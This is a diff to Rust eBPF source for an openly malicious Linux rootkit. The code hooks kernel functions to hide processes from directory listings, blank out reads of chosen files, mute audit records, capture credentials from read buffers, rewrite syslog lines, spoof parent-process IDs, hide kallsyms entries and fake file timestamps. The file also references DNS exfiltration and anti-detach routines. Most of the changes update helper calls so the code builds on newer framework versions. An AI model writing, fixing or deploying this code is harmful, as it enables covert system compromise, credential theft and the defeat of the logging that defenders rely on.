@@ -5,19 +5,18 @@ use aya_ebpf::{
     bindings::xdp_action,
     helpers::{
         bpf_get_current_pid_tgid, bpf_ktime_get_ns, bpf_probe_read_kernel, bpf_probe_read_user,
-        bpf_probe_write_kernel, bpf_probe_write_user,
+        bpf_probe_write_user,
     },
     macros::{kprobe, kretprobe, map, xdp},
     maps::{HashMap, PerfEventArray},
-    programs::{ProbeContext, XdpContext},
+    programs::{ProbeContext, RetProbeContext, XdpContext},
 };
-use aya_log_ebpf::info;
 use common::{
     CommandPayload, CredentialCapture, DnsExfilChunk, EventHeader, RootkitConfig, TimestompEntry,
     C2_CHACHA20_KEY, CHACHA20_NONCE_LEN, EVENT_ANCESTRY_SPOOFED, EVENT_ANTI_DETACH,
-    EVENT_C2_AUTH_FAILED, EVENT_CRED_CAPTURED, EVENT_DNS_EXFIL, EVENT_FILE_OBFUSCATED,
-    EVENT_KALLSYMS_HIDDEN, EVENT_LOG_TAMPERED, EVENT_PACKET_INTERCEPTED, EVENT_PROC_HIDDEN,
-    EVENT_TELEMETRY_MUTED, EVENT_TIMESTOMPED, MAGIC_BYTES,
+    EVENT_C2_AUTH_FAILED, EVENT_DNS_EXFIL, EVENT_FILE_OBFUSCATED, EVENT_KALLSYMS_HIDDEN,
+    EVENT_LOG_TAMPERED, EVENT_PACKET_INTERCEPTED, EVENT_TELEMETRY_MUTED, EVENT_TIMESTOMPED,
+    MAGIC_BYTES,
 };
 use core::mem;
 
@@ -162,22 +161,22 @@ pub fn shadow_getdents64_enter(ctx: ProbeContext) -> u32 {
 
 fn try_getdents64_enter(ctx: &ProbeContext) -> Result<u32, i64> {
     let buf_ptr: u64 = ctx.arg(1).ok_or(1i64)?;
-    let tgid = bpf_get_current_pid_tgid();
+    let tgid = unsafe { bpf_get_current_pid_tgid() };
     GETDENTS_BUFS.insert(&tgid, &buf_ptr, 0).map_err(|_| 2i64)?;
     Ok(0)
 }
 
 /// Kernel return: iterate entries and hide matching PIDs.
 #[kretprobe]
-pub fn shadow_getdents64_exit(ctx: ProbeContext) -> u32 {
+pub fn shadow_getdents64_exit(ctx: RetProbeContext) -> u32 {
     match try_getdents64_exit(&ctx) {
         Ok(ret) => ret,
         Err(_) => 0,
     }
 }
 
-fn try_getdents64_exit(ctx: &ProbeContext) -> Result<u32, i64> {
-    let tgid = bpf_get_current_pid_tgid();
+fn try_getdents64_exit(ctx: &RetProbeContext) -> Result<u32, i64> {
+    let tgid = unsafe { bpf_get_current_pid_tgid() };
     let buf_ptr = unsafe { GETDENTS_BUFS.get(&tgid).ok_or(1i64)? };
     let buf_ptr = *buf_ptr;
     let _ = GETDENTS_BUFS.remove(&tgid);
@@ -188,17 +187,10 @@ fn try_getdents64_exit(ctx: &ProbeContext) -> Result<u32, i64> {
     }
     let total_bytes = ret_val as u64;
 
-    let mut probe_byte: u8 = 0;
-    let probe_result = unsafe {
-        bpf_probe_read_kernel(
-            &mut probe_byte as *mut u8 as *mut core::ffi::c_void,
-            1,
-            buf_ptr as *const core::ffi::c_void,
-        )
+    let _probe_byte = match unsafe { bpf_probe_read_user(buf_ptr as *const u8) } {
+        Ok(v) => v,
+        Err(_) => return Ok(0),
     };
-    if probe_result < 0 {
-        return Ok(0);
-    }
 
     let mut offset: u64 = 0;
     let mut prev_reclen_ptr: u64 = 0;
@@ -211,17 +203,9 @@ fn try_getdents64_exit(ctx: &ProbeContext) -> Result<u32, i64> {
 
         let entry_ptr = buf_ptr + offset;
         let reclen_ptr = entry_ptr + 16;
-        let d_reclen: u16 = unsafe {
-            let mut val: u16 = 0;
-            if bpf_probe_read_kernel(
-                &mut val as *mut u16 as *mut core::ffi::c_void,
-                mem::size_of::<u16>() as u32,
-                reclen_ptr as *const core::ffi::c_void,
-            ) < 0
-            {
-                break;
-            }
-            val
+        let d_reclen: u16 = match unsafe { bpf_probe_read_user(reclen_ptr as *const u16) } {
+            Ok(v) => v,
+            Err(_) => break,
         };
 
         if d_reclen == 0 {
@@ -229,14 +213,9 @@ fn try_getdents64_exit(ctx: &ProbeContext) -> Result<u32, i64> {
         }
 
         let name_ptr = entry_ptr + 19;
-        let mut d_name: [u8; 16] = [0u8; 16];
-        unsafe {
-            if bpf_probe_read_kernel(
-                d_name.as_mut_ptr() as *mut core::ffi::c_void,
-                16,
-                name_ptr as *const core::ffi::c_void,
-            ) < 0
-            {
+        let d_name: [u8; 16] = match unsafe { bpf_probe_read_user(name_ptr as *const [u8; 16]) } {
+            Ok(v) => v,
+            Err(_) => {
                 offset += d_reclen as u64;
                 continue;
             }
@@ -250,9 +229,8 @@ fn try_getdents64_exit(ctx: &ProbeContext) -> Result<u32, i64> {
                     let new_reclen = prev_reclen_val + d_reclen;
                     unsafe {
                         let _ = bpf_probe_write_user(
-                            prev_reclen_ptr as *mut core::ffi::c_void,
-                            &new_reclen as *const u16 as *const core::ffi::c_void,
-                            mem::size_of::<u16>() as u32,
+                            prev_reclen_ptr as *mut u16,
+                            &new_reclen as *const u16,
                         );
                     }
                     prev_reclen_val = new_reclen;
@@ -260,9 +238,8 @@ fn try_getdents64_exit(ctx: &ProbeContext) -> Result<u32, i64> {
                     let dot_name: [u8; 2] = [b'.', 0];
                     unsafe {
                         let _ = bpf_probe_write_user(
-                            (entry_ptr + 19) as *mut core::ffi::c_void,
-                            dot_name.as_ptr() as *const core::ffi::c_void,
-                            2,
+                            (entry_ptr + 19) as *mut [u8; 2],
+                            &dot_name as *const [u8; 2],
                         );
                     }
                     prev_reclen_ptr = reclen_ptr;
@@ -503,46 +480,34 @@ fn try_shadow_vfs_read(ctx: &ProbeContext) -> Result<u32, i64> {
     let buf_ptr: u64 = ctx.arg(1).ok_or(2i64)?;
     let count: u64 = ctx.arg(2).ok_or(3i64)?;
 
-    let tgid = (bpf_get_current_pid_tgid() >> 32) as u32;
+    let tgid = (unsafe { bpf_get_current_pid_tgid() } >> 32) as u32;
     if let Some(config) = unsafe { CONFIG.get(&0u32) } {
         if tgid == config.self_pid {
             return Ok(0);
         }
     }
 
-    let f_inode_ptr: u64 = unsafe {
-        let mut val: u64 = 0;
-        if bpf_probe_read_kernel(
-            &mut val as *mut u64 as *mut core::ffi::c_void,
-            mem::size_of::<u64>() as u32,
-            (file_ptr + FILE_F_INODE_OFFSET) as *const core::ffi::c_void,
-        ) < 0
-        {
-            return Ok(0);
-        }
-        val
+    let f_inode_ptr: u64 = match unsafe {
+        bpf_probe_read_kernel((file_ptr + FILE_F_INODE_OFFSET) as *const u64)
+    } {
+        Ok(v) => v,
+        Err(_) => return Ok(0),
     };
 
     if f_inode_ptr == 0 {
         return Ok(0);
     }
 
-    let i_ino: u64 = unsafe {
-        let mut val: u64 = 0;
-        if bpf_probe_read_kernel(
-            &mut val as *mut u64 as *mut core::ffi::c_void,
-            mem::size_of::<u64>() as u32,
-            (f_inode_ptr + INODE_I_INO_OFFSET) as *const core::ffi::c_void,
-        ) < 0
-        {
-            return Ok(0);
-        }
-        val
+    let i_ino: u64 = match unsafe {
+        bpf_probe_read_kernel((f_inode_ptr + INODE_I_INO_OFFSET) as *const u64)
+    } {
+        Ok(v) => v,
+        Err(_) => return Ok(0),
     };
 
     let marker = unsafe { OBFUSCATE_INODES.get(&i_ino) };
     if marker.is_none() {
-        let pid_tgid = bpf_get_current_pid_tgid();
+        let pid_tgid = unsafe { bpf_get_current_pid_tgid() };
         let _ = VFS_READ_ARGS.insert(
             &pid_tgid,
             &VfsReadCtx {
@@ -555,7 +520,7 @@ fn try_shadow_vfs_read(ctx: &ProbeContext) -> Result<u32, i64> {
         return Ok(0);
     }
 
-    let pid_tgid = bpf_get_current_pid_tgid();
+    let pid_tgid = unsafe { bpf_get_current_pid_tgid() };
     let _ = VFS_READ_ARGS.insert(
         &pid_tgid,
         &VfsReadCtx {
@@ -575,7 +540,7 @@ fn try_shadow_vfs_read(ctx: &ProbeContext) -> Result<u32, i64> {
     let zero_len = if count > 256 { 256u32 } else { count as u32 };
     let zeros: [u8; 256] = [0u8; 256];
     unsafe {
-        let _ = bpf_probe_write_user(
+        let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
             buf_ptr as *mut core::ffi::c_void,
             zeros.as_ptr() as *const core::ffi::c_void,
             zero_len,
@@ -606,7 +571,7 @@ pub fn shadow_mute_audit(ctx: ProbeContext) -> u32 {
 }
 
 fn try_mute_audit(_ctx: &ProbeContext) -> Result<u32, i64> {
-    let tgid = (bpf_get_current_pid_tgid() >> 32) as u32;
+    let tgid = (unsafe { bpf_get_current_pid_tgid() } >> 32) as u32;
 
     if unsafe { HIDDEN_PIDS.get(&tgid).is_none() } {
         return Ok(0);
@@ -632,7 +597,7 @@ pub fn shadow_mute_audit_log_end(ctx: ProbeContext) -> u32 {
 }
 
 fn try_mute_audit_log_end(_ctx: &ProbeContext) -> Result<u32, i64> {
-    let tgid = (bpf_get_current_pid_tgid() >> 32) as u32;
+    let tgid = (unsafe { bpf_get_current_pid_tgid() } >> 32) as u32;
 
     if unsafe { HIDDEN_PIDS.get(&tgid).is_none() } {
         return Ok(0);
@@ -643,17 +608,9 @@ fn try_mute_audit_log_end(_ctx: &ProbeContext) -> Result<u32, i64> {
         return Ok(0);
     }
 
-    let skb_ptr: u64 = unsafe {
-        let mut val: u64 = 0;
-        if bpf_probe_read_kernel(
-            &mut val as *mut u64 as *mut core::ffi::c_void,
-            mem::size_of::<u64>() as u32,
-            ab_ptr as *const core::ffi::c_void,
-        ) < 0
-        {
-            return Ok(0);
-        }
-        val
+    let skb_ptr: u64 = match unsafe { bpf_probe_read_kernel(ab_ptr as *const u64) } {
+        Ok(v) => v,
+        Err(_) => return Ok(0),
     };
 
     if skb_ptr == 0 {
@@ -680,7 +637,7 @@ fn try_cred_harvest(ctx: &ProbeContext) -> Result<u32, i64> {
     let buf_ptr: u64 = ctx.arg(1).ok_or(2i64)?;
     let count: u64 = ctx.arg(2).ok_or(3i64)?;
 
-    let tgid = (bpf_get_current_pid_tgid() >> 32) as u32;
+    let tgid = (unsafe { bpf_get_current_pid_tgid() } >> 32) as u32;
 
     if let Some(config) = unsafe { CONFIG.get(&0u32) } {
         if tgid == config.self_pid {
@@ -703,7 +660,7 @@ fn try_cred_harvest(ctx: &ProbeContext) -> Result<u32, i64> {
     };
 
     unsafe {
-        if bpf_probe_read_kernel(
+        if aya_ebpf::helpers::gen::bpf_probe_read_user(
             capture.data.as_mut_ptr() as *mut core::ffi::c_void,
             read_len,
             buf_ptr as *const core::ffi::c_void,
@@ -746,26 +703,26 @@ pub fn shadow_tamper_logs_enter(ctx: ProbeContext) -> u32 {
         buf_ptr,
         len,
     };
-    let _ = unsafe { SYSLOG_ARGS.insert(&pid_tgid, &entry, 0) };
+    let _ = SYSLOG_ARGS.insert(&pid_tgid, &entry, 0);
     0
 }
 
 #[kretprobe]
-pub fn shadow_tamper_logs(ctx: ProbeContext) -> u32 {
+pub fn shadow_tamper_logs(ctx: RetProbeContext) -> u32 {
     match try_tamper_logs(&ctx) {
         Ok(ret) => ret,
         Err(_) => 0,
     }
 }
 
-fn try_tamper_logs(_ctx: &ProbeContext) -> Result<u32, i64> {
+fn try_tamper_logs(_ctx: &RetProbeContext) -> Result<u32, i64> {
     let pid_tgid = unsafe { bpf_get_current_pid_tgid() };
 
     let args = match unsafe { SYSLOG_ARGS.get(&pid_tgid) } {
         Some(a) => *a,
         None => return Ok(0),
     };
-    let _ = unsafe { SYSLOG_ARGS.remove(&pid_tgid) };
+    let _ = SYSLOG_ARGS.remove(&pid_tgid);
 
     if args.buf_ptr == 0 || args.len == 0 {
         return Ok(0);
@@ -779,7 +736,7 @@ fn try_tamper_logs(_ctx: &ProbeContext) -> Result<u32, i64> {
 
     let mut buf: [u8; 2048] = [0u8; 2048];
     unsafe {
-        if bpf_probe_read_user(
+        if aya_ebpf::helpers::gen::bpf_probe_read_user(
             buf.as_mut_ptr() as *mut core::ffi::c_void,
             scan_len as u32,
             args.buf_ptr as *const core::ffi::c_void,
@@ -832,7 +789,7 @@ fn try_tamper_logs(_ctx: &ProbeContext) -> Result<u32, i64> {
             let write_len = (line_end - line_start) as u32;
             if write_len > 0 && write_len < 2048 {
                 unsafe {
-                    let _ = bpf_probe_write_user(
+                    let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
                         (args.buf_ptr + line_start as u64) as *mut core::ffi::c_void,
                         buf[line_start..].as_ptr() as *const core::ffi::c_void,
                         write_len,
@@ -862,14 +819,14 @@ fn try_tamper_logs(_ctx: &ProbeContext) -> Result<u32, i64> {
 // ──────────────────────────────────────────────
 
 #[kretprobe]
-pub fn shadow_spoof_ancestry(ctx: ProbeContext) -> u32 {
+pub fn shadow_spoof_ancestry(ctx: RetProbeContext) -> u32 {
     match try_spoof_ancestry(&ctx) {
         Ok(ret) => ret,
         Err(_) => 0,
     }
 }
 
-fn try_spoof_ancestry(_ctx: &ProbeContext) -> Result<u32, i64> {
+fn try_spoof_ancestry(_ctx: &RetProbeContext) -> Result<u32, i64> {
     let pid_tgid = unsafe { bpf_get_current_pid_tgid() };
 
     let args = match unsafe { VFS_READ_ARGS.get(&pid_tgid) } {
@@ -888,7 +845,7 @@ fn try_spoof_ancestry(_ctx: &ProbeContext) -> Result<u32, i64> {
     };
     let mut buf: [u8; 512] = [0u8; 512];
     unsafe {
-        if bpf_probe_read_user(
+        if aya_ebpf::helpers::gen::bpf_probe_read_user(
             buf.as_mut_ptr() as *mut core::ffi::c_void,
             scan_len as u32,
             args.buf_ptr as *const core::ffi::c_void,
@@ -1002,7 +959,7 @@ fn try_spoof_ancestry(_ctx: &ProbeContext) -> Result<u32, i64> {
         }
 
         unsafe {
-            let _ = bpf_probe_write_user(
+            let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
                 (args.buf_ptr + ppid_offset as u64) as *mut core::ffi::c_void,
                 overwrite.as_ptr() as *const core::ffi::c_void,
                 write_len as u32,
@@ -1145,14 +1102,14 @@ fn try_dns_exfil(ctx: &aya_ebpf::programs::TcContext) -> Result<i32, i64> {
 // ──────────────────────────────────────────────
 
 #[kretprobe]
-pub fn shadow_hide_kallsyms(ctx: ProbeContext) -> u32 {
+pub fn shadow_hide_kallsyms(ctx: RetProbeContext) -> u32 {
     match try_hide_kallsyms(&ctx) {
         Ok(ret) => ret,
         Err(_) => 0,
     }
 }
 
-fn try_hide_kallsyms(_ctx: &ProbeContext) -> Result<u32, i64> {
+fn try_hide_kallsyms(_ctx: &RetProbeContext) -> Result<u32, i64> {
     let pid_tgid = unsafe { bpf_get_current_pid_tgid() };
 
     let args = match unsafe { VFS_READ_ARGS.get(&pid_tgid) } {
@@ -1179,7 +1136,7 @@ fn try_hide_kallsyms(_ctx: &ProbeContext) -> Result<u32, i64> {
     };
     let mut buf: [u8; 4096] = [0u8; 4096];
     unsafe {
-        if bpf_probe_read_user(
+        if aya_ebpf::helpers::gen::bpf_probe_read_user(
             buf.as_mut_ptr() as *mut core::ffi::c_void,
             scan_len as u32,
             args.buf_ptr as *const core::ffi::c_void,
@@ -1241,7 +1198,7 @@ fn try_hide_kallsyms(_ctx: &ProbeContext) -> Result<u32, i64> {
             scan_len as u32
         };
         unsafe {
-            let _ = bpf_probe_write_user(
+            let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
                 args.buf_ptr as *mut core::ffi::c_void,
                 buf.as_ptr() as *const core::ffi::c_void,
                 write_len,
@@ -1283,7 +1240,7 @@ fn try_anti_detach(ctx: &aya_ebpf::programs::TracePointContext) -> Result<u32, i
         return Ok(0);
     }
 
-    let tgid = (bpf_get_current_pid_tgid() >> 32) as u32;
+    let tgid = (unsafe { bpf_get_current_pid_tgid() } >> 32) as u32;
 
     if let Some(config) = unsafe { CONFIG.get(&0u32) } {
         if tgid == config.self_pid {
@@ -1397,51 +1354,33 @@ pub fn shadow_timestomp_enter(ctx: ProbeContext) -> u32 {
         return 0;
     }
 
-    let dentry_ptr: u64 = unsafe {
-        let mut val: u64 = 0;
-        if bpf_probe_read_kernel(
-            &mut val as *mut u64 as *mut core::ffi::c_void,
-            8,
-            (path_ptr + PATH_DENTRY_OFFSET) as *const core::ffi::c_void,
-        ) < 0
-        {
-            return 0;
-        }
-        val
+    let dentry_ptr: u64 = match unsafe {
+        bpf_probe_read_kernel((path_ptr + PATH_DENTRY_OFFSET) as *const u64)
+    } {
+        Ok(v) => v,
+        Err(_) => return 0,
     };
 
     if dentry_ptr == 0 {
         return 0;
     }
 
-    let inode_ptr: u64 = unsafe {
-        let mut val: u64 = 0;
-        if bpf_probe_read_kernel(
-            &mut val as *mut u64 as *mut core::ffi::c_void,
-            8,
-            (dentry_ptr + DENTRY_D_INODE_OFFSET) as *const core::ffi::c_void,
-        ) < 0
-        {
-            return 0;
-        }
-        val
+    let inode_ptr: u64 = match unsafe {
+        bpf_probe_read_kernel((dentry_ptr + DENTRY_D_INODE_OFFSET) as *const u64)
+    } {
+        Ok(v) => v,
+        Err(_) => return 0,
     };
 
     if inode_ptr == 0 {
         return 0;
     }
 
-    let i_ino: u64 = unsafe {
-        let mut val: u64 = 0;
-        if bpf_probe_read_kernel(
-            &mut val as *mut u64 as *mut core::ffi::c_void,
-            8,
-            (inode_ptr + INODE_I_INO_OFFSET) as *const core::ffi::c_void,
-        ) < 0
-        {
-            return 0;
-        }
-        val
+    let i_ino: u64 = match unsafe {
+        bpf_probe_read_kernel((inode_ptr + INODE_I_INO_OFFSET) as *const u64)
+    } {
+        Ok(v) => v,
+        Err(_) => return 0,
     };
 
     if unsafe { TIMESTOMP_INODES.get(&i_ino).is_none() } {
@@ -1453,26 +1392,26 @@ pub fn shadow_timestomp_enter(ctx: ProbeContext) -> u32 {
         kstat_ptr,
         inode: i_ino,
     };
-    let _ = unsafe { GETATTR_ARGS.insert(&pid_tgid, &entry, 0) };
+    let _ = GETATTR_ARGS.insert(&pid_tgid, &entry, 0);
     0
 }
 
 #[kretprobe]
-pub fn shadow_timestomp(ctx: ProbeContext) -> u32 {
+pub fn shadow_timestomp(ctx: RetProbeContext) -> u32 {
     match try_timestomp(&ctx) {
         Ok(ret) => ret,
         Err(_) => 0,
     }
 }
 
-fn try_timestomp(_ctx: &ProbeContext) -> Result<u32, i64> {
+fn try_timestomp(_ctx: &RetProbeContext) -> Result<u32, i64> {
     let pid_tgid = unsafe { bpf_get_current_pid_tgid() };
 
     let args = match unsafe { GETATTR_ARGS.get(&pid_tgid) } {
         Some(a) => *a,
         None => return Ok(0),
     };
-    let _ = unsafe { GETATTR_ARGS.remove(&pid_tgid) };
+    let _ = GETATTR_ARGS.remove(&pid_tgid);
 
     if args.kstat_ptr == 0 {
         return Ok(0);
@@ -1486,12 +1425,12 @@ fn try_timestomp(_ctx: &ProbeContext) -> Result<u32, i64> {
     let zero_nsec: i64 = 0;
 
     unsafe {
-        let _ = bpf_probe_write_kernel(
+        let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
             (args.kstat_ptr + KSTAT_ATIME_OFFSET) as *mut core::ffi::c_void,
             &entry.fake_atime_sec as *const u64 as *const core::ffi::c_void,
             8,
         );
-        let _ = bpf_probe_write_kernel(
+        let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
             (args.kstat_ptr + KSTAT_ATIME_OFFSET + 8) as *mut core::ffi::c_void,
             &zero_nsec as *const i64 as *const core::ffi::c_void,
             8,
@@ -1499,12 +1438,12 @@ fn try_timestomp(_ctx: &ProbeContext) -> Result<u32, i64> {
     }
 
     unsafe {
-        let _ = bpf_probe_write_kernel(
+        let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
             (args.kstat_ptr + KSTAT_MTIME_OFFSET) as *mut core::ffi::c_void,
             &entry.fake_mtime_sec as *const u64 as *const core::ffi::c_void,
             8,
         );
-        let _ = bpf_probe_write_kernel(
+        let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
             (args.kstat_ptr + KSTAT_MTIME_OFFSET + 8) as *mut core::ffi::c_void,
             &zero_nsec as *const i64 as *const core::ffi::c_void,
             8,
@@ -1512,12 +1451,12 @@ fn try_timestomp(_ctx: &ProbeContext) -> Result<u32, i64> {
     }
 
     unsafe {
-        let _ = bpf_probe_write_kernel(
+        let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
             (args.kstat_ptr + KSTAT_CTIME_OFFSET) as *mut core::ffi::c_void,
             &entry.fake_ctime_sec as *const u64 as *const core::ffi::c_void,
             8,
         );
-        let _ = bpf_probe_write_kernel(
+        let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
             (args.kstat_ptr + KSTAT_CTIME_OFFSET + 8) as *mut core::ffi::c_void,
             &zero_nsec as *const i64 as *const core::ffi::c_void,
             8,
@@ -1535,11 +1474,7 @@ fn try_timestomp(_ctx: &ProbeContext) -> Result<u32, i64> {
     Ok(0)
 }
 
-// Continued in next message due to length...
-
 #[panic_handler]
 fn panic(_info: &core::panic::PanicInfo) -> ! {
     unsafe { core::hint::unreachable_unchecked() }
 }
-
-// Made with Bob
